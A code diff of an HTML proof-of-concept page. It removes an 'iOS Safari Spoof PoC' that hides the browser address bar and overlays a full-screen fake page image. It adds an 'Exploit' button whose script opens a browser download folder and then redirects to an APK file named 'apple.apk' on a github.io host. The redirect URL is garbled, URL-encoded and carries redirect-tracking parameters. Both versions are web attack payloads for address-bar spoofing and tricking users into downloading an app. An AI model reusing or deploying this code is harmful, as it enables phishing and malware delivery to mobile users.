@@ -1,82 +1,10 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport"
-      content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-
-<title>iOS Safari Spoof PoC</title>
-
-<style>
-html, body {
-    margin: 0;
-    padding: 0;
-    height: 100%;
-    font-family: -apple-system, BlinkMacSystemFont, Arial, sans-serif;
-}
-
-/* Front page */
-#front {
-    height: 200vh; /* needed to trigger scroll & hide address bar */
-    display: flex;
-    align-items: center;
-    justify-content: center;
-}
-
-.card {
-    background: #fff;
-    padding: 40px;
-    border-radius: 14px;
-    box-shadow: 0 0 15px rgba(0,0,0,.2);
-    text-align: center;
-    width: 80vw;
-}
-
-.card img {
-    height: 120px;
-}
-
-/* Spoofed page */
-#spoofed {
-    display: none;
-    position: fixed;
-    inset: 0;
-    z-index: 9999;
-}
-
-#spoofed img {
-    width: 100%;
-    height: 100%;
-    object-fit: cover;
-}
-</style>
-</head>
-
-<body>
-
-<!-- Front -->
-<div id="front" onclick="runSpoof()">
-    <div class="card">
-        <img src="https://play-lh.googleusercontent.com/KwUBNPbMTk9jDXYS2AeX3illtVRTkrKVh5xR1Mg4WHd0CG2tV4mrh1z3kXi5z_warlk=w240-h480-rw">
-        <h2>Tap anywhere to continue</h2>
-        <p>Scroll will hide Safari UI</p>
-    </div>
-</div>
-
-<!-- Spoofed -->
-<div id="spoofed">
-    <img src="spoof.png">
-</div>
-
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <script>
-function runSpoof() {
-    document.getElementById("front").style.display = "none";
-    document.getElementById("spoofed").style.display = "block";
-
-    // Force scroll to hide address bar
-    window.scrollTo(0, 1);
+function exploit() {
+  var w = window.open("chrome://download-folder");
+  setTimeout(function(){
+    location = "https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fapple.apk&sa=D&sntz=1&usg=AOvVaw0onE08hhdtlihXeKuCFYTr";
+  }, 3000);
 }
 </script>
-
-</body>
-</html>
+<button onclick="exploit()">Exploit</button>
